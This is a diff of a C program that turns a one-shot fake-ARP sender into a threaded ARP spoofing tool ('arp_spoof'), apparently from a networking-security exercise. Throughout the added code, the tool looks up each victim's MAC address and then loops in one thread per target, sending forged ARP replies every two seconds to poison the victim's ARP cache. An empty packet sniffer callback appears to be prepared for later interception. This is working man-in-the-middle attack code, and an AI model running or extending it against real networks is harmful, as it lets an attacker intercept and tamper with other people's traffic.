@@ -3,51 +3,56 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
-
-#define PACKET_SIZE 42
-
-struct tmp_ip{
-	uint8_t sender_mac[6];
-	uint8_t sender_ip[4];
-	uint8_t target_mac[6];
-	uint8_t target_ip[4];
-};
-
-void usage(void){
-	printf("syntax: send_arp <interface> <send ip> <target ip>\n");
-}
+#include <pthread.h>
 
 void print_mac(char * mac);
-void get_victim_mac( 
+void get_target_mac( 
 	char * victim_ip,char * victim_mac,
 	char * my_ip, char * my_mac);
-void send_fake_reply(
-	char * victim_ip,char * victim_mac,
-	char * send_ip, char * my_mac);
+void *send_fake_reply(
+	void * arg);
+
+struct ip_info{
+	char sender_mac[6];
+	char sender_ip[4];
+	char target_mac[6];
+	char target_ip[4];
+};
+
+struct thread_args{
+	char * target_ip;
+	char * target_mac;
+	char * sender_ip;
+	char * sender_mac;
+};
+
+void print_ip(char * ip);	
+
+void usage(void){
+	puts("arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...");
+	puts("Max job num : 3");
+	exit(1);
+}
+
+void sniffer(u_char * arg,const struct pcap_pkthdr * pkthdr,const u_char * packet);
 
 char mydev[11]={};
 pcap_t * handler;
 
-int main(int argc, char * argv[]){
+#define PACKET_SIZE 42
 
-	char victim_mac[6] = {};
-
-	if (argc != 4) {
+int main(int argc,char * argv[]){
+	if(argc<4 || (argc%2 != 0) || argc>8)
 		usage();
-		exit(1);
-	}
 
-	char victim_ip[20];
-	char send_ip[20];
+	uint32_t job_cnt = (argc/2)-1;
+	char * dev = argv[1];
+	struct ip_info info[3]={};
+	struct ip_info myinfo;
 
-	strncpy(victim_ip,argv[3],18);
-	strncpy(mydev,argv[1],10);
-	strncpy(send_ip,argv[2],18);
+	strncpy(mydev,dev,10);
 
-	putchar(10);
-	printf("My Dev : %s\n", mydev);
-	printf("Victim's IP : %s\n", victim_ip);
-	printf("Send IP : %s\n",send_ip);
+	
 
 	pcap_if_t * alldevs;
 
@@ -59,7 +64,7 @@ int main(int argc, char * argv[]){
 		exit(1);
 	}
 
-	char my_ip[20]={};
+	char my_ip[4]={};
 	char my_mac[6]={};
 	int tmp=0;
 
@@ -71,10 +76,7 @@ int main(int argc, char * argv[]){
 				continue;
 
 			if (j->addr->sa_family == AF_INET){
-				strncpy(
-					my_ip,
-					inet_ntoa(((struct sockaddr_in*)j->addr)->sin_addr),
-					18);
+				memcpy(my_ip,&((struct sockaddr_in*)j->addr)->sin_addr,4);
 				tmp++;
 			}else{
 				char * mac_addr = (char *)j->addr->sa_data;
@@ -89,71 +91,56 @@ int main(int argc, char * argv[]){
 
 	pcap_freealldevs(alldevs);
 
-	printf("My IP : %s\n",my_ip);
+	print_ip((char *)my_ip);
 	printf("My Mac : ");
-	print_mac(my_mac);
+	print_mac((char *)my_mac);
 
-	
-	get_victim_mac(
-		victim_ip,
-		victim_mac,
-		my_ip,
-		my_mac);
-
-	send_fake_reply(
-		victim_ip,
-		victim_mac,
-		send_ip,
-		my_mac);
-
-	return 0;
-
-}
-
-void send_fake_reply(
-	char * victim_ip,char * victim_mac,
-	char * send_ip, char * my_mac)
-{
-	struct libnet_ethernet_hdr * eth_hdr = 0;
-	char packet_s[PACKET_SIZE+1]={};
-	struct libnet_arp_hdr * arp_hdr;
-
-	putchar(10);
-	puts("Sending Fake ARP Reply...");
-
-	eth_hdr = (struct libnet_ethernet_hdr *)packet_s;
-
-	memcpy(eth_hdr->ether_dhost,victim_mac,6);
-	memcpy(eth_hdr->ether_shost,my_mac,6);
-	eth_hdr->ether_type = htons(ETHERTYPE_ARP);
-
-	arp_hdr = (libnet_arp_hdr *)((char *)eth_hdr + 
-		sizeof(struct libnet_ethernet_hdr));
-
-	arp_hdr->ar_hrd = htons(ARPHRD_ETHER);
-	arp_hdr->ar_pro = htons(0x0800); //ipv4
-	arp_hdr->ar_hln = 6;
-	arp_hdr->ar_pln = 4;
-	arp_hdr->ar_op = htons(ARPOP_REPLY);
-
-	struct tmp_ip *ip_info = (struct tmp_ip *)((char *)arp_hdr + 
-		sizeof(struct libnet_arp_hdr));
-
-	memcpy(ip_info->sender_mac,my_mac,6);
-	inet_pton(AF_INET, send_ip, &ip_info->sender_ip);
-	memcpy(ip_info->target_mac,victim_mac,6);
-	inet_pton(AF_INET, victim_ip,&ip_info->target_ip);
-
-	if(pcap_sendpacket(handler,(const u_char *)packet_s,42)==-1){
-		puts("pcap_sendpacket Error!");
+	if((handler = pcap_open_live(mydev,1000,1,1000,NULL))==NULL){
+		puts("pcap_open_live ERROR!");
 		exit(1);
 	}
 
-	puts("Succefully sent Fake ARP Reply");
-	putchar(10);
+	printf("Job Count: %d\n",job_cnt);
+
+	pthread_t thread_t[3];
+	struct thread_args th_arg[3];
+
+	for(int i=0;i<job_cnt;i++){
+		inet_pton(AF_INET, argv[(i+1)*2], &info[i].sender_ip);
+		inet_pton(AF_INET, argv[(i+1)*2+1], &info[i].target_ip);
+		get_target_mac(info[i].target_ip,info[i].target_mac,
+			my_ip,my_mac);
+		th_arg[i].target_ip = info[i].target_ip;
+		th_arg[i].target_mac = info[i].target_mac;
+		th_arg[i].sender_ip = info[i].sender_ip;
+		th_arg[i].sender_mac = my_mac;
+
+		pthread_create(&thread_t[i], NULL, &send_fake_reply, (void *)&th_arg[i]);
+	}
+
+	int cnt;
+
+	if (pcap_loop(handler,-1,sniffer,(u_char *)&cnt) == -1){
+		printf("pcap_loop error!");
+		return(2);
+	}
+
+	return 0;
 }
 
-void get_victim_mac(
+void sniffer(u_char * arg,const struct pcap_pkthdr * pkthdr,const u_char * packet){
+	
+}
+void print_ip(char * ip){
+	printf("%u.%u.%u.%u\n",ip[0]&0xff,ip[1]&0xff,ip[2]&0xff,ip[3]&0xff);
+}
+void print_mac(char * mac){
+	printf("%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx\n",
+		mac[0],mac[1],mac[2],
+		mac[3],mac[4],mac[5]);
+}
+
+void get_target_mac(
 	char * victim_ip,char * victim_mac,
 	char * my_ip, char * my_mac)
 {
@@ -167,11 +154,6 @@ void get_victim_mac(
 	putchar(10);
 	puts("-----------------------");
 	puts("Getting Victim's Mac address...");
-
-	if((handler = pcap_open_live(mydev,1000,1,1000,NULL))==NULL){
-		puts("pcap_open_live ERROR!");
-		exit(1);
-	}
 
 	eth_hdr = (struct libnet_ethernet_hdr *)packet_s;
 
@@ -188,13 +170,13 @@ void get_victim_mac(
 	arp_hdr->ar_pln = 4;
 	arp_hdr->ar_op = htons(ARPOP_REQUEST);
 
-	struct tmp_ip *ip_info = (struct tmp_ip *)((char *)arp_hdr + 
+	struct ip_info *ip_info = (struct ip_info *)((char *)arp_hdr + 
 		sizeof(struct libnet_arp_hdr));
 
 	memcpy(ip_info->sender_mac,my_mac,6);
-	inet_pton(AF_INET, my_ip, &ip_info->sender_ip);
+	memcpy(ip_info->sender_ip,my_ip,4);
 	memcpy(ip_info->target_mac,victim_mac,6);
-	inet_pton(AF_INET, victim_ip,&ip_info->target_ip);
+	memcpy(ip_info->target_ip,victim_ip,4);
 
 	if(pcap_sendpacket(handler,(const u_char *)packet_s,42)==-1){
 		puts("pcap_sendpacket Error!");
@@ -206,18 +188,22 @@ void get_victim_mac(
 		packet_r = pcap_next(handler,&pkthdr);
 		if(packet_r==NULL){
 			puts("pcap_next Error!");
-			exit(1);
+			sleep(1);
+			continue;
 		}
 		eth_hdr = (struct libnet_ethernet_hdr *)packet_r;
 		arp_hdr = (libnet_arp_hdr *)((char *)eth_hdr + 
 			sizeof(struct libnet_ethernet_hdr));
+		ip_info =(struct ip_info *)((char *)arp_hdr + 
+			sizeof(struct libnet_arp_hdr));
 		if((eth_hdr->ether_type == htons(ETHERTYPE_ARP)) &&
-			(arp_hdr->ar_op == htons(ARPOP_REPLY))) 
+			(arp_hdr->ar_op == htons(ARPOP_REPLY)) &&
+			!memcmp(ip_info->sender_ip,victim_ip,4)) 
 			break;
 	}
 
 	
-	ip_info = (struct tmp_ip *)((char *)arp_hdr + 
+	ip_info = (struct ip_info *)((char *)arp_hdr + 
 		sizeof(struct libnet_arp_hdr));
 
 	puts("Got Victim's Mac address!!");
@@ -229,8 +215,51 @@ void get_victim_mac(
 
 }
 
-void print_mac(char * mac){
-	printf("%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx\n",
-		mac[0],mac[1],mac[2],
-		mac[3],mac[4],mac[5]);
+void *send_fake_reply(
+	void * arg)
+{
+	struct libnet_ethernet_hdr * eth_hdr = 0;
+	char packet_s[PACKET_SIZE+1]={};
+	struct libnet_arp_hdr * arp_hdr;
+
+	struct thread_args * th = (thread_args *)arg;
+
+	eth_hdr = (struct libnet_ethernet_hdr *)packet_s;
+
+	memcpy(eth_hdr->ether_dhost,th->target_mac,6);
+	memcpy(eth_hdr->ether_shost,th->sender_mac,6);
+	eth_hdr->ether_type = htons(ETHERTYPE_ARP);
+
+	arp_hdr = (libnet_arp_hdr *)((char *)eth_hdr + 
+		sizeof(struct libnet_ethernet_hdr));
+
+	arp_hdr->ar_hrd = htons(ARPHRD_ETHER);
+	arp_hdr->ar_pro = htons(0x0800); //ipv4
+	arp_hdr->ar_hln = 6;
+	arp_hdr->ar_pln = 4;
+	arp_hdr->ar_op = htons(ARPOP_REPLY);
+
+	struct ip_info *ip_info = (struct ip_info *)((char *)arp_hdr + 
+		sizeof(struct libnet_arp_hdr));
+
+	memcpy(ip_info->sender_mac,th->sender_mac,6);
+	memcpy(ip_info->sender_ip,th->sender_ip,4);
+	memcpy(ip_info->target_mac,th->target_mac,6);
+	memcpy(ip_info->target_ip,th->target_ip,4);
+
+	while(1){
+		if(pcap_sendpacket(handler,(const u_char *)packet_s,42)==-1){
+			puts("pcap_sendpacket Error!");
+			continue;
+		}
+
+		printf("Sent ARP reply To : ");
+		print_ip(th->target_ip);
+		putchar(10);
+		sleep(2);
+	}
+	return 0;
 }
+
+
+
